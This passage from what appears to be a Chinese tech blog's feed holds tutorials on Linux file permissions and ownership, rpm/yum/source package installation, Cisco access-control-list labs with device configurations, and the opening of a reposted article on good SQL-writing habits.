Linux里常见的文件系统：ext2/3/4、vfat（3）格式化了以后：分为inode和block。 inode：索引节点号，书的目录，存储的是文件的属性。唯独不包含文件名。 block：是文件内容的真实存储位置。文件名是存储在上一级目录的block中。（4）文件属性介绍：ls -lhi  282152 -rw-r--r-- 1 root root    0 Nov 27 19:31 bbbbbbbbbbb.txt 282155 lrwxrwxrwx 1 root root   15 Nov 27 19:31 b.txt -> bbbbbbbbbbb.txt 字段1：文件的inode节点号 字段2：一共10位，第一位表示文件类型；后边9位，每3个为一组，分别表示属主/属组/其他人 字段3：硬链接数 字段4：属主 字段5：属组 字段6：文件大小 字段7、8/9：文件的修改时间 字段10：文件名（5）软硬连接 创建软链接的方式:ln -s bbbbbbbbbbb.txt（源文件） b.txt 创建硬链接的方式:ln    bbbbbbbbbbb.txt（源文件） b.txt</code></pre></li></ol><h2 id="0x03-权限划分"><a href="#0x03-权限划分" class="headerlink" title="0x03 权限划分"></a>0x03 权限划分</h2><ol><li>文件的权限（对内容）<ul><li>r（read）：可读取此文件的实际内容，入读取文本文件的文字内容等。</li><li>w（write）：可以编辑、新增或者修改该文件内容（但不包含删除该文件）。</li><li>x（execute）：该文件具有被可以被系统执行的权限。</li></ul></li><li>目录的权限<ul><li>r（read contents in directory）：具有读取目录结构清单的权限。</li><li>w（modify contents of directory）：<ul><li>创建新的文件与目录</li><li>删除已存在的文件与目录</li><li>将已存在的文件或目录进行更名</li><li>移动该目录内文件或目录的位置</li></ul></li><li>x（access directory）：进入该目录的权限，即没有该权限不能使用<code>cd</code>命令进入该目录</li></ul></li></ol><h2 id="0x04-权限设置"><a href="#0x04-权限设置" class="headerlink" title="0x04 权限设置"></a>0x04 权限设置</h2><pre class=" language-shell"><code class="language-shell"># 调整权限的命令格式chmod [ugoa] [+-=] [rwx] 文件/目录u:文件属主g:文件属组o:其他用户a:代表所有人(a=u+g+o)# 文件属主添加写权限chmod u+w demo.txt# 文件属组删除执行权限chmod g-r demo.txt# 为所有人设置读权限chmod a=r demo.txt# 为所有人设置读写执行全新啊chmod 777 demo.txt# 递归权限设置(将tmp目录权限设置为755，同时递归到目录下的所有对象)chmod -R 755 /tmp</code></pre><h2 id="0x05-归属设置"><a href="#0x05-归属设置" class="headerlink" title="0x05 归属设置"></a>0x05 归属设置</h2><pre class=" language-shell"><code class="language-shell"># 更改指定目录的属主和属组chown 属主:属组 文件/目录  # 更改指定目录的属主chown 属主 文件/目录# 更改执行目录的数组chown :属组 文件/目录# 使用递归方式变更目录及其之下的所有文件chown [-R] dirname/filename# 将aa.txt文件的属主改为zhangsan 属组改为jishubuchown zhangsan:jishubu aa.txt# 将/tmp/demo目录及其下属的所有文件的属主都设置为grimchown -R grim /tmp/demo</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之软件包管理</title>
      <link href="/2020/12/07/linux-zhi-ruan-jian-bao-guan-li/"/>
      <url>/2020/12/07/linux-zhi-ruan-jian-bao-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="常见软件包"><a href="#常见软件包" class="headerlink" title="常见软件包"></a>常见软件包</h1><ol><li><p>二进制包：可以直接被计算机识别和执行。</p><p>特点：不需要编译，可以直接执行；但是安装时间比较长。</p></li><li><p>源码包：source code是程序员编写的源代码，不能被机器识别和执行；我们把源码包转化为二进制包的过程叫做“编译”。<br>特点：需要进行编译，安装时间比较长。</p></li><li><p>rpm包：是由redhat公司开发的把源码包直接进行编译转化为二进制包，重新进行封装<br>特点：可以直接安装，并且大大节省了安装时间。需要解决包之间的依赖关系.</p></li><li><p>yum包:在rpm的基础上解决了包之间的依赖关系.</p></li></ol><h1 id="常见的安装方式"><a href="#常见的安装方式" class="headerlink" title="常见的安装方式"></a>常见的安装方式</h1><ul><li><p><strong>RPM工具</strong>：RPM包是预先在Linux机器上编译好并打包好的文件，安装起来非常快捷。但是也有一些缺点，比如安装的环境必须与编译时的环境一致或者相当；包与包之间存在着相互依赖的情况。</p></li><li><p><strong>yum工具</strong>：yum最大的优势在于可以联网去下载所需要的rpm包，然后自动安装，在这个过程中如果要安装的rpm包有依赖关系，yum会帮你解决掉这些依赖关系依次安装所有rpm包。</p></li><li><p><strong>源码包</strong>：安装一个源码包，是需要我们自己把源代码编译成二进制的可执行文件。如果你读得懂这些源代码，那么你就可以去修改这些源代码自定义功能，然后再去编译成你想要的。使用源码包的好处除了可以自定义修改源代码外还可以定制相关的功能，因为源码包在编译的时候是可以附加额外的选项的。</p></li></ul><p>下面将使用不同的方式安装GCC编译器。</p><h1 id="使用rpm工具安装软件（CentOS7）"><a href="#使用rpm工具安装软件（CentOS7）" class="headerlink" title="使用rpm工具安装软件（CentOS7）"></a>使用rpm工具安装软件（CentOS7）</h1><h2 id="0x01-设置光驱并挂在"><a href="#0x01-设置光驱并挂在" class="headerlink" title="0x01 设置光驱并挂在"></a>0x01 设置光驱并挂在</h2><ol><li><p>将安装系统时使用的ISO文件放入光驱中，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/将ISO文件放入光驱.png" alt="将ISO文件放入光驱"></center></li><li><p>将光驱挂在到<code>/mnt</code>目录下，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/挂载镜像文件到mnt目录.png" alt="挂载镜像文件到mnt目录"></center></li><li><p>查看挂载的镜像内容，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/查看挂在镜像内容.png" alt="查看挂在镜像内容"></center><p><code>Packages</code>目录下为镜像中所有的RPM安装包。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/部分安装包先死.png" alt="部分安装包显示"></center></li></ol><h2 id="0x02-使用RPM工具安装GCC编译器"><a href="#0x02-使用RPM工具安装GCC编译器" class="headerlink" title="0x02 使用RPM工具安装GCC编译器"></a>0x02 使用RPM工具安装GCC编译器</h2><ol><li><p>使用如下命令安装GCC编译器，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">rpm -ivh mpfr-3.1.1-4.el7.x86_64.rpmrpm -ivh libmpc-1.0.1-3.el7.x86_64.rpmrpm -ivh kernel-headers-3.10.0-862.el7.x86_64.rpmrpm -ivh glibc-headers-2.17-222.el7.x86_64.rpmrpm -ivh glibc-devel-2.17-222.el7.x86_64.rpmrpm -ivh cpp-4.8.5-28.el7.x86_64.rpmrpm -ivh gcc-4.8.5-28.el7.x86_64.rpm</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/使用rpm安装软件过程显示.png" alt="使用rpm安装软件过程显示"></center></li><li><p>使用<code>gcc -v</code>命令验证GCC编译器是否安装成功，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/验证rpm安装软件结果.png" alt="验证rpm安装软件结果"></center></li></ol><h2 id="0x03-使用rpm工具卸载GCC编译器"><a href="#0x03-使用rpm工具卸载GCC编译器" class="headerlink" title="0x03 使用rpm工具卸载GCC编译器"></a>0x03 使用rpm工具卸载GCC编译器</h2><ol><li><p>使用<code>rpm -q gcc</code>检查已安装的GCC版本，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/使用rpm检查已安装gcc的版本.png" alt="使用rpm检查已安装gcc的版本"></center></li><li><p>使用使用如下命令卸载GCC及其依赖，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">rpm -e gccrpm -e cpprpm -e glibc-develrpm -e glibc-headersrpm -e kernel-headersrpm -e libmpcrpm -e mpfr</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/使用rpm卸载gcc.png" alt="使用rpm卸载gcc"></center></li></ol><h1 id="使用yum工具安装软件（CentOS7）"><a href="#使用yum工具安装软件（CentOS7）" class="headerlink" title="使用yum工具安装软件（CentOS7）"></a>使用yum工具安装软件（CentOS7）</h1><h2 id="0x01-使用yum工具安装GCC编译器"><a href="#0x01-使用yum工具安装GCC编译器" class="headerlink" title="0x01 使用yum工具安装GCC编译器"></a>0x01 使用yum工具安装GCC编译器</h2><ol><li><p>使用<code>yum install gcc</code>命令安装GCC编译器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/使用yum安装gcc.png" alt="使用yum安装gcc"></center><p>在光标处输入<code>y</code>即可开始安装</p></li><li><p>使用<code>gcc -v</code>命令验证GCC编译器是否安装成功，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/yum安装gcc结果.png" alt="yum安装gcc结果"></center></li></ol><h2 id="0x02-使用yum工具卸载GCC编译器"><a href="#0x02-使用yum工具卸载GCC编译器" class="headerlink" title="0x02 使用yum工具卸载GCC编译器"></a>0x02 使用yum工具卸载GCC编译器</h2><ol><li><p>使用<code>yum remove gcc</code>命令卸载gcc编译器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/使用yum卸载gcc编译器.png" alt="使用yum卸载gcc编译器"></center><p><font color="blue">仅仅会卸载gcc其安装时候的依赖项不会被卸载</font>。</p></li></ol><h1 id="使用源码包安装软件（CentOS7）"><a href="#使用源码包安装软件（CentOS7）" class="headerlink" title="使用源码包安装软件（CentOS7）"></a>使用源码包安装软件（CentOS7）</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/源代码编译过程.png" alt="源代码编译过程"></center><ol><li><p>下载软件源码。使用Git将GitHub上的<code>foremost</code>源码下载至本地，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/下载源码.png" alt="下载源码"></center></li><li><p>编译。使用gcc编译器将源码编译成可执行的二进制文件，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/编译.png" alt="编译"></center></li><li><p>安装。使用<code>make install</code>复制二进制文件到系统，配置应用环境，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/安装.png" alt="安装"></center></li><li><p>验证。使用<code>foremost -h</code>命令验证软件是否安装成功，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/InstallSotfware/验证是否安装成功.png" alt="验证是否安装成功"></center></li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="rpm常用命令"><a href="#rpm常用命令" class="headerlink" title="rpm常用命令"></a>rpm常用命令</h2><pre class=" language-shell"><code class="language-shell">##安装软件 -v显示过程 -h指定加密方式为hashrpm -ivh gcc-4.8.5-28.el7.x86_64.rpm ## 静默安装rpm install -y gcc-4.8.5-28.el7.x86_64.rpm ##卸载软件rpm -e gcc ##查询包安装后会生成什么文件rpm -qpl gcc-4.8.5-28.el7.x86_64.rpm ## 查询所有安装的rpm软件包并且过滤处wps相关的安装包rpm -qa | grep wps ##查看查看已安装的某软件包的信息rpm -qi gcc ##查看软件生成的文件rpm -ql gcc ##查询软件包安装后的名字rpm -qp gcc-4.8.5-28.el7.x86_64.rpm ##检测包在安装或卸载过程中执行的动作rpm -qp gcc-4.8.5-28.el7.x86_64.rpm --scripts ## 查看一个文件是由那个包安装的rpm -qf /usr/bin/vim ##强制安装，但是不能忽略依赖性rpm -ivh rpm -pq gcc-4.8.5-28.el7.x86_64.rpm --force ##忽略软件的依赖性并且强制安装rpm -ivh rpm -pq gcc-4.8.5-28.el7.x86_64.rpm --nodeps # 重建RPM数据库rpm --rebuilddbrpm --initdb# 导入验证公钥rpm --import /media/cdrom/RPM-GPG-KEY-redhat-release</code></pre><h2 id="yum常用命令"><a href="#yum常用命令" class="headerlink" title="yum常用命令"></a>yum常用命令</h2><pre class=" language-shell"><code class="language-shell">## 列出可用rpm包yum list # 查看软件包的开发信息yum info 名字                ## 搜索指定包yum search gcc## 安装指定软件(静默)yun install -y gcc## 列出组的rpm包yum grouplist## 安装软件yum install gccyum groupinstall 组包名## 卸载指定安装包yun remove -y gcc## 升级指定安装包yum update -y gcc## 清除yum缓存目录yum clean all## 生成yum缓存yum makecache# 检查是否有可用更新（整个系统更新检查）yum check-update            ## 修改yum的配置文件vim /etc/yum.repos.d/CentOS-Base.repo</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/xiyushimei/p/8550930.html" target="_blank" rel="noopener">Linux——CentOS7安装gcc编译器详解</a></li><li><a href="https://blog.csdn.net/weixin_43407305/article/details/83589136" target="_blank" rel="noopener">利用rpm命令安装软件</a></li><li><a href="https://blog.csdn.net/mojianbin/article/details/78523161?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control" target="_blank" rel="noopener">安装软件包的三种方法、rpm包介绍、rpm、yum工具用法与yum搭建本地仓库</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之ACL实验</title>
      <link href="/2020/12/06/wang-luo-pei-zhi-zhi-acl-shi-yan/"/>
      <url>/2020/12/06/wang-luo-pei-zhi-zhi-acl-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ul><li><p>拒绝<code>192.168.1.96/27</code>访问FTP</p></li><li><p>拒绝<code>192.168.161/27</code>访问FTP符</p></li><li><p>拒绝<code>192.168.1.128/27</code>访问Web服务</p></li><li><p>允许其他所有访问</p></li></ul><p>附加：</p><ul><li><p>拒绝<code>192.168.1.2/27</code>访问<code>192.168.1.32/27</code>网段</p></li><li><p>只允许<code>192.168.1.1/27</code>主机可以<code>telnet</code>三层交换机</p></li><li><p>只允许<code>192.168.1.2</code>使用<code>ssh</code>管理三层交换机</p></li></ul><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="0x01-基础配置"><a href="#0x01-基础配置" class="headerlink" title="0x01 基础配置"></a>0x01 基础配置</h2><ol><li><p>SW0交换机的基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/SW0基础配置.png" alt="SW0基础配置"></center></li><li><p>multiSW0交换机的基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/multiSW0基础配置.png" alt="multiSW0基础配置"></center></li><li><p>Router0路由器的基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/R0基础配置.png" alt="R0基础配置"></center></li><li><p>SW1交换机的基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/SW1基础配置.png" alt="SW1基础配置"></center></li></ol><h2 id="0x02-应用于服务器的ACL"><a href="#0x02-应用于服务器的ACL" class="headerlink" title="0x02 应用于服务器的ACL"></a>0x02 应用于服务器的ACL</h2><ol><li><p>在Router0的<code>f0/0</code>接口配置ACL，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/对服务的ACL配置.png" alt="对服务的ACL配置"></center></li><li><p>验证ACL是应用成功，这里只验证第一条ACL，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/验证ACL1.png" alt="验证ACL"></center></li></ol><h2 id="0x03-远程管理的配置"><a href="#0x03-远程管理的配置" class="headerlink" title="0x03 远程管理的配置"></a>0x03 远程管理的配置</h2><ol><li><p>在三层交换机上配置Telnet，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/三层交换机配置Telnet.png" alt="三层交换机配置Telnet"></center></li><li><p>在三层交换机上配置SSH，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/三层交换机配置SSH.png" alt="三层交换机配置SSH"></center></li></ol><h2 id="0x04-应用于三层交换机的ACL"><a href="#0x04-应用于三层交换机的ACL" class="headerlink" title="0x04 应用于三层交换机的ACL"></a>0x04 应用于三层交换机的ACL</h2><ol><li><p>在三层交换机上配置ACL，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/应用于三层交换机的ACL.png" alt="应用于三层交换机的ACL"></center></li><li><p>验证ACL是否应用成功，这里值验证应用于SSH的ACL，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ACL/验证ACL2.png" alt="验证ACL"></center></li></ol><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><ul><li>ACL的创建步骤为：<ul><li>创建ACL</li><li>将ACL应用于接口（需要指定<code>in/out</code>）</li></ul></li><li>当一个ACL中有多条规则时，要的别关注应用的接口和方向</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><pre class=" language-shell"><code class="language-shell">基础配置：SW0配置：enconf thostname SW0vlan 10vlan 100exint range f0/1-2switchport mode accessswitchport access vlan 10int f0/3switchport mode accessswitchport access vlan 100int f0/4switchport mode trunkmultiSW0配置:enconf thostname multiSW0int f0/1switchport trunk encapsulation dot1qswitchport mode trunkvlan 10vlan 100exint vlan 10ip add 192.168.1.30 255.255.255.224no shint vlan 100ip add 192.168.1.62 255.255.255.224no shint f0/2no switchportip add 192.168.1.65 255.255.255.224no shexip routingip route 0.0.0.0 0.0.0.0 192.168.1.66Router0配置：enconf thostname Router0int f0/0ip add 192.168.1.66 255.255.255.224no shint f1/0ip add 192.168.1.190 255.255.255.224no shint f0/1.1encapsulation dot1Q 20ip add 192.168.1.126 255.255.255.224no shint f0/1.2encapsulation dot1Q 200ip add 192.168.1.158 255.255.255.224no shint f0/1no shexip route 0.0.0.0 0.0.0.0 192.168.1.65SW1配置:enconf thostname SW1vlan 20vlan 200exint f0/1switchport mode accessswitchport access vlan 20int f0/2switchport mode accessswitchport access vlan 200int f0/3switchport mode trunkRouter0的f0/0接口配置ACL：1.拒绝192.168.1.96/27访问FTP2.拒绝192.168.161/27访问FTP符3.拒绝192.168.1.128/27访问Web服务4.允许其他所有访问access-list 101 deny tcp 192.168.1.96 0.0.0.31 host 192.168.1.33 eq 21access-list 101 deny tcp host 192.168.1.161 host 192.168.1.33 eq 21access-list 101 deny tcp 192.168.1.128 0.0.0.31 host 192.168.1.33 eq 80access-list 101 permit tcp any anyint f0/0ip access-group 101 outtelnet配置：enable pass ciscousername cisco password 0 ciscoline vty 0 4login localssh配置：hostname multiSW0ip domain-name cisco.comip ssh time-out 120ip ssh authentication-retries 3crypto key generate rsa general-keys modulus 1024username admin password 0 adminline vty 5 9transport input alllogin local1.拒绝192.168.1.2/27访问192.168.1.32/27网段（multiSW）2.只允许192.168.1.1/27主机可以telnet三层交换机3.只允许192.168.1.2使用ssh管理三层交换机access-list 102 deny ip host 192.168.1.2 192.168.1.32 0.0.0.31access-list 102 permit tcp host 192.168.1.1 host 192.168.1.1 eq telnetaccess-list 102 permit tcp host 192.168.1.2 host 192.168.1.1 eq 22access-list 102 permit ip any anyint vlan 10ip access-group 102 in</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之ACL</title>
      <link href="/2020/12/06/wang-luo-pei-zhi-zhi-acl/"/>
      <url>/2020/12/06/wang-luo-pei-zhi-zhi-acl/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-ACL概述"><a href="#0x01-ACL概述" class="headerlink" title="0x01 ACL概述"></a>0x01 ACL概述</h1><ol><li><p>什么是ACL？</p><p>ACL，即访问控制列表，ACL可以读取第三层、第四层的包头信息，并根据预先定义好的规则对包进行过滤。</p></li><li><p>应用ACL时需要注意什么？</p><ul><li>ACL必须应用到接口上才能生效；</li><li>一个接口最多应用两个ACL，<strong>出方向</strong>和<strong>入方向</strong>。<ul><li>outside：已经过路由器的处理，当从此接口离开时才生效的ACL；</li><li>inside：到达路由器并从此接口进入路由器时才生效的ACL。</li></ul></li></ul></li><li><p>ACL的处理过程？</p><ul><li>首先会匹配第一条ACL，若匹配成功且为拒绝则直接丢弃该数据包；若匹配成功且为允许则将数据包转到目的接口；若匹配不成功，则继续匹配下一条ACL；后续的匹配过程亦是如此。</li><li>若所有规则都不匹配则丢弃该数据包，因为ACL规则默认为拒绝。</li></ul></li></ol><h1 id="0x02-ACL分类"><a href="#0x02-ACL分类" class="headerlink" title="0x02 ACL分类"></a>0x02 ACL分类</h1><ul><li>标准ACL<ul><li>基于源IP地址过滤数据包</li><li>标准ACL的访问控制列表号是1-99</li></ul></li><li>扩展ACL<ul><li>基于协议、源IP地址、目的IP地址、端口和标志来过滤数据包</li><li>扩展ACL的访问控制列表号是100-199</li></ul></li><li>命令ACL<ul><li>命名ACL允许在标准和扩展访问控制列表中使用名称代替表号</li></ul></li></ul><h1 id="0x03-ACL应用"><a href="#0x03-ACL应用" class="headerlink" title="0x03 ACL应用"></a>0x03 ACL应用</h1><ol><li><p>标准ACL</p><pre class=" language-shell"><code class="language-shell"># 拒绝主机192.168.1.1的流量通过R(config)#access-list 1 deny 192.168.1.1 0.0.0.0R(config)#access-list 1 deny host 192.168.1.1# 允许192.168.1.0/24的流量通过R(config)#access-list 1 permit 192.168.1.0 0.0.0.255# 隐含的拒绝语句（拒绝所有主机）R(config)#access-list 1 deny 0.0.0.0 255.255.255.255R(config)#access-list 1 deny anyR(config)#int f0/1# 将ACL应用到f0/1的入方向（出方向为out）R(config-if)#ip access-group 1 in</code></pre></li><li><p>扩展ACL</p><pre class=" language-shell"><code class="language-shell"># 允许192.168.1.0/24中的主机访问192.168.2.0/24中的主机R(config)#access-list 101 permit ip 192.168.1.0 0.0.0.255 12.168.2.0 0.0.0.255# 允许192.168.1.0/24中的主机访问192.168.2.0/24中主机的21号端口R(config)#access-list 101 permit tcp 192.168.1.0 0.0.0.255 12.168.2.0 0.0.0.255 eq 21R(config)#access-list 101 permit tcp 192.168.1.0 0.0.0.255 12.168.2.0 0.0.0.255 eq ftp# 允许所有访问R(config)#access-list 101 permit ip any any# 拒绝192.168.1.0/24中的主机ping192.168.2.2主机R(config)#access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 echoR(config)#int f0/1# 将ACL应用到f0/1的出方向（入方向为in）R(config-if)#ip access-group 101 out</code></pre></li><li><p>命名ACL</p><pre class=" language-shell"><code class="language-shell"># 标准命名ACLR(config)#ip access-list standard Out-to-ISPR(config-std-nacl)#deny 192.168.1.0 0.0.0.255R(config-std-nacl)#permit any # 扩展命名ACLR(config)#ip access-list extended In-to-ISPR(config-ext-nacl)#deny ip host 192.168.2.2 192.168.1.0 0.0.0.255R(config-ext-nacl)#permit ip any anyR(config)#int f0/1R(config-if)#ip access-group Out-to-ISP in</code></pre></li></ol><h1 id="0x04ACL查看"><a href="#0x04ACL查看" class="headerlink" title="0x04ACL查看"></a>0x04ACL查看</h1><pre class=" language-shell"><code class="language-shell"># 查看所有ACLR#show access-lists# 查看编号为1的ACLR#show access-lists 1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21个写SQL的好习惯【转】</title>
      <link href="/2020/12/06/21-ge-xie-sql-de-hao-xi-guan/"/>
      <url>/2020/12/06/21-ge-xie-sql-de-hao-xi-guan/</url>
      
        <content type="html"><![CDATA[<p>​        每一个好习惯都是一笔财富，本文分SQL后悔药， SQL性能优化，SQL规范优雅三个方向，分享写SQL的21个好习惯，谢谢阅读，加油哈~</p><p>公众号：<strong>「捡田螺的小男孩」</strong></p><ol><li><p>写完SQL先<code>explain</code>查看执行计划（SQL性能优化）</p><p>日常开发写SQL的时候，尽量养成这个好习惯呀：写完SQL后，用<code>explain</code>分析一下，尤其注意走不走索引。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">explain</span> <span class="token keyword">select</span> userid<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> userid <span class="token operator">=</span><span class="token number">10086</span> <span class="token operator">or</span> age <span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span></code></pre></li><li><p>操作<code>delete</code>或者<code>update</code>语句，加个<code>limit</code>（SQL后悔药）</p><p>在执行删除或者更新语句，尽量加上limit，以下面的这条 SQL 为例吧：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">delete</span> <span class="token keyword">from</span> euser <span class="token keyword">where</span> age <span class="token operator">></span> <span class="token number">30</span> <span class="token keyword">limit</span> <span class="token number">200</span><span class="token punctuation">;</span></code></pre><p>因为加了limit 主要有这些好处：<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9zTW1yNFhPQ0J6SFpLWmN0bEtQYlJQNDlaRExFTGw3Nm1mUXdFbkZIV2ljaWFjTDBvbEtMRmg4Z1F2azNNb1hvcURud25QNE44T05kRlZ2ekpzNWc5Z3pBLzY0MA?x-oss-process=image/format,png" alt="img"></p></li></ol><ul><li><strong>「降低写错SQL的代价」</strong>, 你在命令行执行这个SQL的时候，如果不加limit，执行的时候一个<strong>「不小心手抖」</strong>，可能数据全删掉了，如果<strong>「删错」</strong>了呢？加了limit 200，就不一样了。删错也只是丢失200条数据，可以通过binlog日志快速恢复的。</li><li><strong>「SQL效率很可能更高」</strong>，你在SQL行中，加了limit 1，如果第一条就命中目标return， 没有limit的话，还会继续执行扫描表。</li><li><strong>「避免了长事务」</strong>，delete执行时,如果age加了索引，MySQL会将所有相关的行加写锁和间隙锁，所有执行相关行会被锁住，如果删除数量大，会直接影响相关业务无法使用。</li><li><strong>「数据量大的话，容易把CPU打满」</strong> ,如果你删除数据量很大时，不加 limit限制一下记录数，容易把cpu打满，导致越删越慢的。</li></ul><ol start="3"><li><p>设计表的时候，所有表和字段都添加相应的注释（SQL规范优雅）</p><p>这个好习惯一定要养成啦，设计数据库表的时候，所有表和字段都添加相应的注释，后面更容易维护。</p><p><strong>「正例：」</strong></p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>account<span class="token punctuation">`</span> <span class="token punctuation">(</span>  <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span> <span class="token keyword">COMMENT</span> <span class="token string">'主键Id'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'账户名'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>balance<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'余额'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>create_time<span class="token punctuation">`</span> <span class="token keyword">datetime</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'创建时间'</span><span class="token punctuation">,</span>  <span class="token punctuation">`</span>update_time<span class="token punctuation">`</span> <span class="token keyword">datetime</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CURRENT_TIMESTAMP</span> <span class="token keyword">COMMENT</span> <span class="token string">'更新时间'</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">KEY</span> <span class="token punctuation">`</span>idx_name<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>name<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">USING</span> <span class="token keyword">BTREE</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">1570068</span> <span class="token 